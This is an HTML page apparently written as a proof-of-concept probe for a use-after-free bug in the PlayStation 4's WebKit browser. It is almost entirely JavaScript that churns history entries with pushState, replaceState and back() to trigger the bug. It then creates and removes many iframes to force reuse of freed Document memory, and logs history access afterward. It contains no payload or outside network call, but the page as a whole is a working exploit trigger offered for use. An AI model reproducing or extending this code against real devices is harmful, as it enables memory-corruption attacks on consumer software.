<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Document UAF Reuse</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; }
#log { white-space: pre-wrap; }
</style>
</head>

<body>
<h2>PS4 WebKit – HistoryItem → Document Reuse</h2>
<button onclick="run()">RUN DOCUMENT REUSE</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    logEl.textContent = "";
    log("=== START DOCUMENT UAF PROBE ===");

    let size = 977;
    const STEP = 14461;

    // ---------------------------------
    // Phase 1 – EXACT UAF trigger
    // ---------------------------------
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ---------------------------------
    // Phase 2 – Document reuse pressure
    // ---------------------------------
    log("[REUSE] Forcing Document creation/destruction");

    let frames = [];
    for(let i=0;i<100;i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);

        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>"+("X".repeat(1024))+"</body></html>");
            d.close();
        } catch(e){}

        frames.push(f);
    }

    log("[REUSE] Removing frames");
    frames.forEach(f => f.remove());
    frames = null;

    await sleep(50);

    // ---------------------------------
    // Phase 3 – Touch history
    // ---------------------------------
    log("[POST] Accessing history");
    try {
        log("history.length="+history.length);
    } catch(e){
        log("history exception");
    }

    log("=== END PROBE ===");
}
</script>
</body>
</html>
